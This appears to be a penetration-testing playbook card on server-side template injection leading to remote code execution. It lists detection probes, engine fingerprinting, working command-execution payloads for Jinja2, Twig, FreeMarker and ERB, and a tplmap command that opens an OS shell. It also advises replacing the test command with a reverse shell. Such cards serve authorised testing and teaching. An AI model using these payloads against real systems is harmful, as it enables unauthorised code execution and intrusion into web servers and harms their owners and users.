---
id: ssti-rce
title: SSTI → RCE
stage: initial-access
tags: [web]
tools:
  - "tplmap -u 'http://$TARGET/page?name=INJECT' --os-shell"
leads_to:
  - rev-shell
---

## Detection

```
{{7*7}}    → 49  → Jinja2 or Twig
${7*7}     → 49  → FreeMarker or Smarty
<%= 7*7 %> → 49  → ERB (Ruby)
#{7*7}     → 49  → Ruby
```

## Engine Fingerprinting

```
{{7*'7'}} → 7777777  = Jinja2 (Python)
{{7*'7'}} → 49       = Twig (PHP)
```

## Exploitation by Engine

```
# Jinja2 (Flask/Python)
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read()}}

# Twig (PHP)
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

# FreeMarker (Java)
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}

# ERB (Ruby)
<%= `id` %>
```

## Automated

```bash
tplmap -u "http://$TARGET/page?name=INJECT" --os-shell
```

## Notes

SSTI often appears in user-supplied fields that get rendered in templates — email headers, username fields, search boxes. Substitute `id` for a reverse shell once confirmed.
